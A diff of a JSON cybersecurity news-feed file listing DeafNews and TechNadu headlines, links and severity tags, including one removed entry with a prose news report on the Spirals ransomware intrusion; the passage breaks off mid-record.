@@ -1,65 +1,7 @@
 [
   {
-    "id": "cfa1358b98e43732",
-    "date": "2026-07-29T06:45:08.961796+00:00",
-    "source": "DeafNews",
-    "quality": "Medium",
-    "scope": "Research",
-    "category": "",
-    "title": "CRITICAL BRICKSTORM: Chinese Backdoor Targets US and Canadian Critical Infrastructure",
-    "summary": "Discovered from DeafNews page. Open full article for more details.",
-    "article_text": "",
-    "quick_summary": [
-      "Open full article for more details.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://deafnews.it/en/news/malware/brickstorm-chinese-backdoor-targets-us-and-canadian-critical-infrastructure",
-    "target": "CRITICAL BRICKSTORM",
-    "type": "Malware",
-    "severity": "Critical",
-    "sources": [
-      "DeafNews"
-    ],
-    "links": [
-      {
-        "source": "DeafNews",
-        "url": "https://deafnews.it/en/news/malware/brickstorm-chinese-backdoor-targets-us-and-canadian-critical-infrastructure"
-      }
-    ]
-  },
-  {
-    "id": "cfabe7c4e71835a0",
-    "date": "2026-07-29T06:45:08.961699+00:00",
-    "source": "DeafNews",
-    "quality": "Medium",
-    "scope": "Research",
-    "category": "",
-    "title": "CVE CVE-2026-56163: Microsoft Mitigates Critical AKS Flaw Without Customer Action",
-    "summary": "Discovered from DeafNews page. Open full article for more details.",
-    "article_text": "",
-    "quick_summary": [
-      "Open full article for more details.",
-      "Risk: vulnerability/exploitation risk, ISNET vendor relevance",
-      "Action: check affected products, patch status, and exposed services."
-    ],
-    "link": "https://deafnews.it/en/news/cybersecurity/cve-2026-56163-microsoft-mitigates-critical-aks-flaw-without-customer-action",
-    "target": "CVE CVE-2026-56163",
-    "type": "Vulnerability",
-    "severity": "Critical",
-    "sources": [
-      "DeafNews"
-    ],
-    "links": [
-      {
-        "source": "DeafNews",
-        "url": "https://deafnews.it/en/news/cybersecurity/cve-2026-56163-microsoft-mitigates-critical-aks-flaw-without-customer-action"
-      }
-    ]
-  },
-  {
     "id": "519c83c44f5078b3",
-    "date": "2026-07-29T06:45:08.961601+00:00",
+    "date": "2026-07-29T09:49:16.517040+00:00",
     "source": "DeafNews",
     "quality": "Medium",
     "scope": "Research",
@@ -88,7 +30,7 @@
   },
   {
     "id": "b628ac901bfd2562",
-    "date": "2026-07-29T06:45:08.961500+00:00",
+    "date": "2026-07-29T09:49:16.516900+00:00",
     "source": "DeafNews",
     "quality": "Medium",
     "scope": "Research",
@@ -121,7 +63,7 @@
   },
   {
     "id": "9bd07fa7a29c94f4",
-    "date": "2026-07-29T06:45:08.961394+00:00",
+    "date": "2026-07-29T09:49:16.516780+00:00",
     "source": "DeafNews",
     "quality": "Medium",
     "scope": "Research",
@@ -150,7 +92,7 @@
   },
   {
     "id": "da8c0199df20fd50",
-    "date": "2026-07-29T06:45:08.961289+00:00",
+    "date": "2026-07-29T09:49:16.516659+00:00",
     "source": "DeafNews",
     "quality": "Medium",
     "scope": "Research",
@@ -178,23 +120,23 @@
     ]
   },
   {
-    "id": "0919186d39a8aaac",
-    "date": "2026-07-29T06:45:08.961193+00:00",
+    "id": "94364d6c6eb19543",
+    "date": "2026-07-29T09:49:16.516546+00:00",
     "source": "DeafNews",
     "quality": "Medium",
     "scope": "Research",
     "category": "",
-    "title": "Spirals: New Rust Ransomware Deployed Across Enterprise Network in Under 24 Hours ransomware",
-    "summary": "A new ransomware actor called Spirals completed a corporate intrusion, from initial access to data theft and encryption, in less than 24 hours. [...]",
-    "article_text": "A new ransomware actor called Spirals completed a corporate intrusion, from initial access to data theft and encryption, in less than 24 hours. The attack occurred in June and breached an IT services firm in South Asia after compromising an Internet Information Services (IIS) server exposed on the public web. Researchers at Symantec's Threat Hunter Team say that the attacker moved quickly after obtaining initial access and uploading an ASP.NET web shell. The Spirals operator then bypassed User Account Control (UAC), enabled Remote Desktop, and created a local account to maintain persistent access. The attacker also dumped the SAM registry hive and LSASS process memory in an attempt to extract credentials. Symantec investigators say that the threat actor tried to remove security software on the hosts, used WMI to move laterally to more than a dozen systems, and established redundant remote access channels using revsocks, Chisel, and Cloudflare tunnels. A PowerShell payload disabled Microsoft Defender, removed its threat definitions, and stopped services associated with 23 backup, database, and virtualization products, including Veeam, VMware, Hyper-V, SQL Server, Oracle, and PostgreSQL, in preparation for the encryption stage. The deployment of the Spirals payload (bitsadmin.exe) occurred less than 24 hours after the initial compromise, reports Symantec. “The operator began deploying the ransomware payload across the victim’s network using PsExec running as SYSTEM,” the researchers explain . “The payload was named bitsadmin.exe, likely to masquerade as the legitimate Windows utility associated with the Background Intelligent Transfer Service, encrypting files on impacted machines.” Spirals is a Rust-based ransomware family that uses AES-128 keys protected by an attacker-controlled ECDH P-256 public key. The ransomware uses intermittent encryption for files larger than 5MB to accelerate the process. A ransom note named RECOVERY_SECTION.log is dropped on the C:\\ drive, containing instructions to negotiate a ransom. Victims are threatened with public exposure of the stolen data within six days, unless the attacker is paid. Despite the presence of the extortion portal, Symantec observed Spirals in a single case so far, so it’s unclear whether the new family is intended for broader cybercrime deployment or if it was a custom payload created specifically for this attack at the IT services firm. Symantec's report provides network indicators and file hashes associated with the documented Spirals attack to help organizations worldwide set up defenses against this threat group. Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. New Prinz Eugen ransomware prioritizes recent files for encryption JadePuffer ransomware used AI agent to automate entire attack Blackfield ransomware asks Nidec Corporation for $2 million ransom US charges alleged operators of Russian bulletproof hosting service US sanctions VPN, malware providers for enabling ransomware attacks Microsoft July 2026 Patch Tuesday fixes massive 570 flaws, 3 zero-days Microsoft: Some Dell PCs shut down after recent Windows updates Windows 11 KB5101650 & KB5099414 cumulative updates released AI broke vulnerability management. Get the guide CISOs use to shift budget to BAS. See how Pixellot discovered and secured hundreds of unmanaged AI agent identities in weeks, not months. Read the case study. How Mature Is Your AI Security Program? Take the Free AI Maturity Assessment. Pentest your web apps on-demand. Find what humans miss. Scope and launch a pentest in minutes. Read our posting guidelinese to learn what content is prohibited.",
+    "title": "CRITICAL OpenWrt: A '90s-Era Buffer Overflow Opens Routers to Remote Takeover",
+    "summary": "Discovered from DeafNews page. Open full article for more details.",
+    "article_text": "",
     "quick_summary": [
       "Open full article for more details.",
-      "Risk: ransomware/extortion",
-      "Action: monitor indicators, backups, remote access, and related vendor exposure."
+      "Risk: general cybersecurity update",
+      "Action: read full article if the vendor/customer/environment is relevant."
     ],
-    "link": "https://deafnews.it/en/news/ransomware/spirals-new-rust-ransomware-deployed-across-enterprise-network-in-under-24-hours",
-    "target": "Spirals",
-    "type": "Ransomware",
+    "link": "https://deafnews.it/en/news/vulnerabilities/openwrt-a-90s-era-buffer-overflow-opens-routers-to-remote-takeover",
+    "target": "CRITICAL OpenWrt",
+    "type": "General Cybersecurity",
     "severity": "Critical",
     "sources": [
       "DeafNews"
@@ -202,46 +144,42 @@
     "links": [
       {
         "source": "DeafNews",
-        "url": "https://deafnews.it/en/news/ransomware/spirals-new-rust-ransomware-deployed-across-enterprise-network-in-under-24-hours"
-      },
-      {
-        "source": "BleepingComputer",
-        "url": "https://www.bleepingcomputer.com/news/security/new-spirals-ransomware-encrypts-victim-network-in-under-24-hours/"
+        "url": "https://deafnews.it/en/news/vulnerabilities/openwrt-a-90s-era-buffer-overflow-opens-routers-to-remote-takeover"
       }
     ]
   },
   {
-    "id": "104efe13220b2918",
-    "date": "2026-07-29T06:45:08.961075+00:00",
+    "id": "7ac66e1687ea7a81",
+    "date": "2026-07-29T09:49:16.516419+00:00",
     "source": "DeafNews",
     "quality": "Medium",
     "scope": "Research",
     "category": "",
-    "title": "Hotel Wi-Fi DNS Attacks Steal Microsoft 365 Accounts, Bypass MFA CYBERSEC",
+    "title": "ZERO-DAY Russian Zero-Clicks Empty Zimbra Webmail Without a Single Click",
     "summary": "Discovered from DeafNews page. Open full article for more details.",
     "article_text": "",
     "quick_summary": [
       "Open full article for more details.",
-      "Risk: ISNET vendor relevance",
-      "Action: read full article if the vendor/customer/environment is relevant."
+      "Risk: vulnerability/exploitation risk",
+      "Action: check affected products, patch status, and exposed services."
     ],
-    "link": "https://deafnews.it/en/news/cybersecurity/hotel-wi-fi-dns-attacks-steal-microsoft-365-accounts-bypass-mfa",
-    "target": "Hotel Wi-Fi DNS Steal",
-    "type": "General Cybersecurity",
-    "severity": "Low",
+    "link": "https://deafnews.it/en/news/cybersecurity/russian-zero-clicks-empty-zimbra-webmail-without-a-single-click",
+    "target": "ZERO-DAY Russian Zero-Clicks Empty",
+    "type": "Vulnerability",
+    "severity": "Critical",
     "sources": [
       "DeafNews"
     ],
     "links": [
       {
         "source": "DeafNews",
-        "url": "https://deafnews.it/en/news/cybersecurity/hotel-wi-fi-dns-attacks-steal-microsoft-365-accounts-bypass-mfa"
+        "url": "https://deafnews.it/en/news/cybersecurity/russian-zero-clicks-empty-zimbra-webmail-without-a-single-click"
       }
     ]
   },
   {
     "id": "97d88778a1ffad53",
-    "date": "2026-07-29T06:45:08.960957+00:00",
+    "date": "2026-07-29T09:49:16.516305+00:00",
     "source": "DeafNews",
     "quality": "Medium",
     "scope": "Research",
@@ -270,7 +208,7 @@
   },
   {
     "id": "8cd1e3271751f8cb",
-    "date": "2026-07-29T06:45:08.960854+00:00",
+    "date": "2026-07-29T09:49:16.516189+00:00",
     "source": "DeafNews",
     "quality": "Medium",
     "scope": "Research",
@@ -299,7 +237,7 @@
   },
   {
     "id": "b780fd0bcb4b3bee",
-    "date": "2026-07-29T06:45:08.960753+00:00",
+    "date": "2026-07-29T09:49:16.516072+00:00",
     "source": "DeafNews",
     "quality": "Medium",
     "scope": "Research",
@@ -328,7 +266,7 @@
   },
   {
     "id": "6c5c6672340c5cc6",
-    "date": "2026-07-29T06:45:08.960639+00:00",
+    "date": "2026-07-29T09:49:16.515925+00:00",
     "source": "DeafNews",
     "quality": "Medium",
     "scope": "Research",
@@ -356,13 +294,42 @@
     ]
   },
   {
-    "id": "db5ae4d0a95a1fa3",
-    "date": "2026-07-29T06:45:08.959324+00:00",
+    "id": "679ef8954834423f",
+    "date": "2026-07-29T09:49:16.515806+00:00",
     "source": "DeafNews",
     "quality": "Medium",
     "scope": "Research",
     "category": "",
-    "title": "// 2 CRITICAL · 5 ZERO-DAY · 5 CVE · 2 EXPLOIT IN THE LAST 24H →",
+    "title": "CVE-2026-56163: Microsoft Mitigates Critical AKS Flaw Without Customer Action CYBERSEC CVE",
+    "summary": "Discovered from DeafNews page. Open full article for more details.",
+    "article_text": "",
+    "quick_summary": [
+      "Open full article for more details.",
+      "Risk: vulnerability/exploitation risk, ISNET vendor relevance",
+      "Action: check affected products, patch status, and exposed services."
+    ],
+    "link": "https://deafnews.it/en/news/cybersecurity/cve-2026-56163-microsoft-mitigates-critical-aks-flaw-without-customer-action",
+    "target": "CVE-2026-56163",
+    "type": "Vulnerability",
+    "severity": "Critical",
+    "sources": [
+      "DeafNews"
+    ],
+    "links": [
+      {
+        "source": "DeafNews",
+        "url": "https://deafnews.it/en/news/cybersecurity/cve-2026-56163-microsoft-mitigates-critical-aks-flaw-without-customer-action"
+      }
+    ]
+  },
+  {
+    "id": "db5ae4d0a95a1fa3",
+    "date": "2026-07-29T09:49:16.514308+00:00",
+    "source": "DeafNews",
+    "quality": "Medium",
+    "scope": "Research",
+    "category": "",
+    "title": "// 2 CRITICAL · 5 ZERO-DAY · 6 CVE · 4 EXPLOIT IN THE LAST 24H →",
     "summary": "Discovered from DeafNews page. Open full article for more details.",
     "article_text": "",
     "quick_summary": [
@@ -386,7 +353,7 @@
   },
   {
     "id": "9bfd46b8df533c12",
-    "date": "2026-07-29T06:45:07.885137+00:00",
+    "date": "2026-07-29T09:49:15.779758+00:00",
     "source": "InfoStealers Weekly Reports",
     "quality": "High",
     "scope": "Weekly",
@@ -454,37 +421,8 @@
     ]
   },
   {
-    "id": "db755cd0f502e63b",
-    "date": "2026-07-29T06:45:05.367453+00:00",
-    "source": "TechNadu",
-    "quality": "Medium",
-    "scope": "General",
-    "category": "",
-    "title": "HermeticReader Flaw (CVE-2026-48294) in Adobe's Acrobat Extension Exposed WhatsApp Chats to Any Website",
-    "summary": "Discovered from TechNadu page. Open full article for more details.",
-    "article_text": "",
-    "quick_summary": [
-      "Open full article for more details.",
-      "Risk: vulnerability/exploitation risk",
-      "Action: check affected products, patch status, and exposed services."
-    ],
-    "link": "https://www.technadu.com/hermeticreader-flaw-cve-2026-48294-in-adobes-acrobat-extension-exposed-whatsapp-chats-to-any-website/631742/",
-    "target": "HermeticReader CVE-2026-48294 Adobes Acrobat",
-    "type": "Data Leak / Breach",
-    "severity": "Medium",
-    "sources": [
-      "TechNadu"
-    ],
-    "links": [
-      {
-        "source": "TechNadu",
-        "url": "https://www.technadu.com/hermeticreader-flaw-cve-2026-48294-in-adobes-acrobat-extension-exposed-whatsapp-chats-to-any-website/631742/"
-      }
-    ]
-  },
-  {
     "id": "9d06822acbacfb99",
-    "date": "2026-07-29T06:45:05.367337+00:00",
+    "date": "2026-07-29T09:49:15.005573+00:00",
     "source": "TechNadu",
     "quality": "Medium",
     "scope": "General",
@@ -517,7 +455,7 @@
   },
   {
     "id": "72dfbb783aa1a131",
-    "date": "2026-07-29T06:45:05.367216+00:00",
+    "date": "2026-07-29T09:49:15.005436+00:00",
     "source": "TechNadu",
     "quality": "Medium",
     "scope": "General",
@@ -546,7 +484,7 @@
   },
   {
     "id": "5d144d963622d317",
-    "date": "2026-07-29T06:45:05.367104+00:00",
+    "date": "2026-07-29T09:49:15.005310+00:00",
     "source": "TechNadu",
     "quality": "Medium",
     "scope": "General",
@@ -575,7 +513,7 @@
   },
   {
     "id": "666a0d6bf326717c",
-    "date": "2026-07-29T06:45:05.366976+00:00",
+    "date": "2026-07-29T09:49:15.005179+00:00",
     "source": "TechNadu",
     "quality": "Medium",
     "scope": "General",
@@ -604,7 +542,7 @@
   },
   {
     "id": "bc1bdf11a37f7ab1",
-    "date": "2026-07-29T06:45:05.366858+00:00",
+    "date": "2026-07-29T09:49:15.005044+00:00",
     "source": "TechNadu",
     "quality": "Medium",
     "scope": "General",
@@ -633,7 +571,7 @@
   },
   {
     "id": "2c3551cc0e259340",
-    "date": "2026-07-29T06:45:05.366731+00:00",
+    "date": "2026-07-29T09:49:15.004886+00:00",
     "source": "TechNadu",
     "quality": "Medium",
     "scope": "General",
@@ -666,7 +604,7 @@
   },
   {
     "id": "b0b4a827efa67c6b",
-    "date": "2026-07-29T06:45:05.366502+00:00",
+    "date": "2026-07-29T09:49:15.004649+00:00",
     "source": "TechNadu",
     "quality": "Medium",
     "scope": "General",
@@ -695,7 +633,7 @@
   },
   {
     "id": "979b49e8969cf04c",
-    "date": "2026-07-29T06:45:05.366383+00:00",
+    "date": "2026-07-29T09:49:15.004515+00:00",
     "source": "TechNadu",
     "quality": "Medium",
     "scope": "General",
@@ -723,269 +661,8 @@
     ]
   },
   {
-    "id": "191256ce0155a788",
-    "date": "2026-07-29T06:45:05.366176+00:00",
-    "source": "TechNadu",
-    "quality": "Medium",
-    "scope": "General",
-    "category": "",
-    "title": "Why Security Teams Should Expect Failure Before They Expect Prevention",
-    "summary": "Discovered from TechNadu page. Open full article for more details.",
-    "article_text": "",
-    "quick_summary": [
-      "Open full article for more details.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.technadu.com/why-security-teams-should-expect-failure-before-they-expect-prevention/629012/",
-    "target": "Teams Should Expect Failure",
-    "type": "General Cybersecurity",
-    "severity": "Low",
-    "sources": [
-      "TechNadu"
-    ],
-    "links": [
-      {
-        "source": "TechNadu",
-        "url": "https://www.technadu.com/why-security-teams-should-expect-failure-before-they-expect-prevention/629012/"
-      }
-    ]
-  },
-  {
-    "id": "d4e76d122f9dd789",
-    "date": "2026-07-29T06:45:05.366044+00:00",
-    "source": "TechNadu",
-    "quality": "Medium",
-    "scope": "General",
-    "category": "",
-    "title": "AI Scaling is Outpacing Enterprise Identity Controls: Why Companies Need AI-Level Monitoring",
-    "summary": "Discovered from TechNadu page. Open full article for more details.",
-    "article_text": "",
-    "quick_summary": [
-      "Open full article for more details.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.technadu.com/ai-scaling-is-outpacing-enterprise-identity-controls-why-companies-need-ai-level-monitoring/628021/",
-    "target": "Scaling Outpacing Enterprise Identity",
-    "type": "General Cybersecurity",
-    "severity": "Low",
-    "sources": [
-      "TechNadu"
-    ],
-    "links": [
-      {
-        "source": "TechNadu",
-        "url": "https://www.technadu.com/ai-scaling-is-outpacing-enterprise-identity-controls-why-companies-need-ai-level-monitoring/628021/"
-      }
-    ]
-  },
-  {
-    "id": "7748a5e101447fc1",
-    "date": "2026-07-29T06:45:05.365908+00:00",
-    "source": "TechNadu",
-    "quality": "Medium",
-    "scope": "General",
-    "category": "",
-    "title": "External Bug Hunters are a Critical Human Layer in AI-Accelerated Security Operations",
-    "summary": "Discovered from TechNadu page. Open full article for more details.",
-    "article_text": "",
-    "quick_summary": [
-      "Open full article for more details.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.technadu.com/external-bug-hunters-are-a-critical-human-layer-in-ai-accelerated-security-operations/628538/",
-    "target": "External Hunters Critical Human",
-    "type": "General Cybersecurity",
-    "severity": "Critical",
-    "sources": [
-      "TechNadu"
-    ],
-    "links": [
-      {
-        "source": "TechNadu",
-        "url": "https://www.technadu.com/external-bug-hunters-are-a-critical-human-layer-in-ai-accelerated-security-operations/628538/"
-      }
-    ]
-  },
-  {
-    "id": "0c69e9f5a96d4e72",
-    "date": "2026-07-29T06:45:05.365741+00:00",
-    "source": "TechNadu",
-    "quality": "Medium",
-    "scope": "General",
-    "category": "",
-    "title": "Why Attackers Understand Supply Chains Better Than Companies",
-    "summary": "Discovered from TechNadu page. Open full article for more details.",
-    "article_text": "",
-    "quick_summary": [
-      "Open full article for more details.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.technadu.com/why-attackers-understand-supply-chains-better-than-companies/628246/",
-    "target": "Attackers Understand Supply Chains",
-    "type": "General Cybersecurity",
-    "severity": "Critical",
-    "sources": [
-      "TechNadu"
-    ],
-    "links": [
-      {
-        "source": "TechNadu",
-        "url": "https://www.technadu.com/why-attackers-understand-supply-chains-better-than-companies/628246/"
-      }
-    ]
-  },
-  {
-    "id": "bee9aebf79cad33c",
-    "date": "2026-07-29T06:45:05.365623+00:00",
-    "source": "TechNadu",
-    "quality": "Medium",
-    "scope": "General",
-    "category": "",
-    "title": "A Legacy of Service: Decoding the Cloak of Trust Worn by Attackers Beyond Security Training or Looking for the Malicious",
-    "summary": "Discovered from TechNadu page. Open full article for more details.",
-    "article_text": "",
-    "quick_summary": [
-      "Open full article for more details.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.technadu.com/a-legacy-of-service-decoding-the-cloak-of-trust-worn-by-attackers-beyond-security-training-or-looking-for-the-malicious/630223/",
-    "target": "Legacy Service",
-    "type": "General Cybersecurity",
-    "severity": "Low",
-    "sources": [
-      "TechNadu"
-    ],
-    "links": [
-      {
-        "source": "TechNadu",
-        "url": "https://www.technadu.com/a-legacy-of-service-decoding-the-cloak-of-trust-worn-by-attackers-beyond-security-training-or-looking-for-the-malicious/630223/"
-      }
-    ]
-  },
-  {
-    "id": "2fa98f4f8ae7fc5e",
-    "date": "2026-07-29T06:45:05.365486+00:00",
-    "source": "TechNadu",
-    "quality": "Medium",
-    "scope": "General",
-    "category": "",
-    "title": "AI Identity Security Needs More Than Technical Depth to Manage Risk and Accountability",
-    "summary": "Discovered from TechNadu page. Open full article for more details.",
-    "article_text": "",
-    "quick_summary": [
-      "Open full article for more details.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.technadu.com/ai-identity-security-needs-more-than-technical-depth-to-manage-risk-and-accountability/631951/",
-    "target": "Identity Needs More Than",
-    "type": "General Cybersecurity",
-    "severity": "Low",
-    "sources": [
-      "TechNadu"
-    ],
-    "links": [
-      {
-        "source": "TechNadu",
-        "url": "https://www.technadu.com/ai-identity-security-needs-more-than-technical-depth-to-manage-risk-and-accountability/631951/"
-      }
-    ]
-  },
-  {
-    "id": "02220f09df8df84c",
-    "date": "2026-07-29T06:45:05.365350+00:00",
-    "source": "TechNadu",
-    "quality": "Medium",
-    "scope": "General",
-    "category": "",
-    "title": "From Coding Mistakes to Misplaced Trust: How AI Tools and Dependencies Expand the Attack Surface",
-    "summary": "Discovered from TechNadu page. Open full article for more details.",
-    "article_text": "",
-    "quick_summary": [
-      "Open full article for more details.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.technadu.com/from-coding-mistakes-to-misplaced-trust-how-ai-tools-and-dependencies-expand-the-attack-surface/630809/",
-    "target": "Coding Mistakes Misplaced Trust",
-    "type": "General Cybersecurity",
-    "severity": "Low",
-    "sources": [
-      "TechNadu"
-    ],
-    "links": [
-      {
-        "source": "TechNadu",
-        "url": "https://www.technadu.com/from-coding-mistakes-to-misplaced-trust-how-ai-tools-and-dependencies-expand-the-attack-surface/630809/"
-      }
-    ]
-  },
-  {
-    "id": "cfcd7be93d0aa926",
-    "date": "2026-07-29T06:45:05.365214+00:00",
-    "source": "TechNadu",
-    "quality": "Medium",
-    "scope": "General",
-    "category": "",
-    "title": "Governing AI Agents Beyond Least Privilege by Controlling Their Access, Decisions, and Actions",
-    "summary": "Discovered from TechNadu page. Open full article for more details.",
-    "article_text": "",
-    "quick_summary": [
-      "Open full article for more details.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.technadu.com/governing-ai-agents-beyond-least-privilege-by-controlling-their-access-decisions-and-actions/631466/",
-    "target": "Governing Agents Beyond Least",
-    "type": "General Cybersecurity",
-    "severity": "Low",
-    "sources": [
-      "TechNadu"
-    ],
-    "links": [
-      {
-        "source": "TechNadu",
-        "url": "https://www.technadu.com/governing-ai-agents-beyond-least-privilege-by-controlling-their-access-decisions-and-actions/631466/"
-      }
-    ]
-  },
-  {
-    "id": "a63286e4bf0c078f",
-    "date": "2026-07-29T06:45:05.365080+00:00",
-    "source": "TechNadu",
-    "quality": "Medium",
-    "scope": "General",
-    "category": "",
-    "title": "How Organizations Can Simplify Compliance Audits by Including Controls in Daily Operations",
-    "summary": "Discovered from TechNadu page. Open full article for more details.",
-    "article_text": "",
-    "quick_summary": [
-      "Open full article for more details.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.technadu.com/how-organizations-can-simplify-compliance-audits-by-including-controls-in-daily-operations/631409/",
-    "target": "Organizations Can Simplify Compliance",
-    "type": "General Cybersecurity",
-    "severity": "Low",
-    "sources": [
-      "TechNadu"
-    ],
-    "links": [
-      {
-        "source": "TechNadu",
-        "url": "https://www.technadu.com/how-organizations-can-simplify-compliance-audits-by-including-controls-in-daily-operations/631409/"
-      }
-    ]
-  },
-  {
     "id": "908457cb1d1bccf3",
-    "date": "2026-07-29T06:45:05.364774+00:00",
+    "date": "2026-07-29T09:49:15.004368+00:00",
     "source": "TechNadu",
     "quality": "Medium",
     "scope": "General",
@@ -1014,7 +691,7 @@
   },
   {
     "id": "7a9776b0260c88f5",
-    "date": "2026-07-29T06:45:05.364644+00:00",
+    "date": "2026-07-29T09:49:15.004226+00:00",
     "source": "TechNadu",
     "quality": "Medium",
     "scope": "General",
@@ -1042,8 +719,269 @@
     ]
   },
   {
+    "id": "191256ce0155a788",
+    "date": "2026-07-29T09:49:15.003937+00:00",
+    "source": "TechNadu",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "Why Security Teams Should Expect Failure Before They Expect Prevention",
+    "summary": "Discovered from TechNadu page. Open full article for more details.",
+    "article_text": "",
+    "quick_summary": [
+      "Open full article for more details.",
+      "Risk: general cybersecurity update",
+      "Action: read full article if the vendor/customer/environment is relevant."
+    ],
+    "link": "https://www.technadu.com/why-security-teams-should-expect-failure-before-they-expect-prevention/629012/",
+    "target": "Teams Should Expect Failure",
+    "type": "General Cybersecurity",
+    "severity": "Low",
+    "sources": [
+      "TechNadu"
+    ],
+    "links": [
+      {
+        "source": "TechNadu",
+        "url": "https://www.technadu.com/why-security-teams-should-expect-failure-before-they-expect-prevention/629012/"
+      }
+    ]
+  },
+  {
+    "id": "d4e76d122f9dd789",
+    "date": "2026-07-29T09:49:15.003787+00:00",
+    "source": "TechNadu",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "AI Scaling is Outpacing Enterprise Identity Controls: Why Companies Need AI-Level Monitoring",
+    "summary": "Discovered from TechNadu page. Open full article for more details.",
+    "article_text": "",
+    "quick_summary": [
+      "Open full article for more details.",
+      "Risk: general cybersecurity update",
+      "Action: read full article if the vendor/customer/environment is relevant."
+    ],
+    "link": "https://www.technadu.com/ai-scaling-is-outpacing-enterprise-identity-controls-why-companies-need-ai-level-monitoring/628021/",
+    "target": "Scaling Outpacing Enterprise Identity",
+    "type": "General Cybersecurity",
+    "severity": "Low",
+    "sources": [
+      "TechNadu"
+    ],
+    "links": [
+      {
+        "source": "TechNadu",
+        "url": "https://www.technadu.com/ai-scaling-is-outpacing-enterprise-identity-controls-why-companies-need-ai-level-monitoring/628021/"
+      }
+    ]
+  },
+  {
+    "id": "7748a5e101447fc1",
+    "date": "2026-07-29T09:49:15.003644+00:00",
+    "source": "TechNadu",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "External Bug Hunters are a Critical Human Layer in AI-Accelerated Security Operations",
+    "summary": "Discovered from TechNadu page. Open full article for more details.",
+    "article_text": "",
+    "quick_summary": [
+      "Open full article for more details.",
+      "Risk: general cybersecurity update",
+      "Action: read full article if the vendor/customer/environment is relevant."
+    ],
+    "link": "https://www.technadu.com/external-bug-hunters-are-a-critical-human-layer-in-ai-accelerated-security-operations/628538/",
+    "target": "External Hunters Critical Human",
+    "type": "General Cybersecurity",
+    "severity": "Critical",
+    "sources": [
+      "TechNadu"
+    ],
+    "links": [
+      {
+        "source": "TechNadu",
+        "url": "https://www.technadu.com/external-bug-hunters-are-a-critical-human-layer-in-ai-accelerated-security-operations/628538/"
+      }
+    ]
+  },
+  {
+    "id": "0c69e9f5a96d4e72",
+    "date": "2026-07-29T09:49:15.003456+00:00",
+    "source": "TechNadu",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "Why Attackers Understand Supply Chains Better Than Companies",
+    "summary": "Discovered from TechNadu page. Open full article for more details.",
+    "article_text": "",
+    "quick_summary": [
+      "Open full article for more details.",
+      "Risk: general cybersecurity update",
+      "Action: read full article if the vendor/customer/environment is relevant."
+    ],
+    "link": "https://www.technadu.com/why-attackers-understand-supply-chains-better-than-companies/628246/",
+    "target": "Attackers Understand Supply Chains",
+    "type": "General Cybersecurity",
+    "severity": "Critical",
+    "sources": [
+      "TechNadu"
+    ],
+    "links": [
+      {
+        "source": "TechNadu",
+        "url": "https://www.technadu.com/why-attackers-understand-supply-chains-better-than-companies/628246/"
+      }
+    ]
+  },
+  {
+    "id": "bee9aebf79cad33c",
+    "date": "2026-07-29T09:49:15.003325+00:00",
+    "source": "TechNadu",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "A Legacy of Service: Decoding the Cloak of Trust Worn by Attackers Beyond Security Training or Looking for the Malicious",
+    "summary": "Discovered from TechNadu page. Open full article for more details.",
+    "article_text": "",
+    "quick_summary": [
+      "Open full article for more details.",
+      "Risk: general cybersecurity update",
+      "Action: read full article if the vendor/customer/environment is relevant."
+    ],
+    "link": "https://www.technadu.com/a-legacy-of-service-decoding-the-cloak-of-trust-worn-by-attackers-beyond-security-training-or-looking-for-the-malicious/630223/",
+    "target": "Legacy Service",
+    "type": "General Cybersecurity",
+    "severity": "Low",
+    "sources": [
+      "TechNadu"
+    ],
+    "links": [
+      {
+        "source": "TechNadu",
+        "url": "https://www.technadu.com/a-legacy-of-service-decoding-the-cloak-of-trust-worn-by-attackers-beyond-security-training-or-looking-for-the-malicious/630223/"
+      }
+    ]
+  },
+  {
+    "id": "2fa98f4f8ae7fc5e",
+    "date": "2026-07-29T09:49:15.003178+00:00",
+    "source": "TechNadu",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "AI Identity Security Needs More Than Technical Depth to Manage Risk and Accountability",
+    "summary": "Discovered from TechNadu page. Open full article for more details.",
+    "article_text": "",
+    "quick_summary": [
+      "Open full article for more details.",
+      "Risk: general cybersecurity update",
+      "Action: read full article if the vendor/customer/environment is relevant."
+    ],
+    "link": "https://www.technadu.com/ai-identity-security-needs-more-than-technical-depth-to-manage-risk-and-accountability/631951/",
+    "target": "Identity Needs More Than",
+    "type": "General Cybersecurity",
+    "severity": "Low",
+    "sources": [
+      "TechNadu"
+    ],
+    "links": [
+      {
+        "source": "TechNadu",
+        "url": "https://www.technadu.com/ai-identity-security-needs-more-than-technical-depth-to-manage-risk-and-accountability/631951/"
+      }
+    ]
+  },
+  {
+    "id": "02220f09df8df84c",
+    "date": "2026-07-29T09:49:15.003017+00:00",
+    "source": "TechNadu",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "From Coding Mistakes to Misplaced Trust: How AI Tools and Dependencies Expand the Attack Surface",
+    "summary": "Discovered from TechNadu page. Open full article for more details.",
+    "article_text": "",
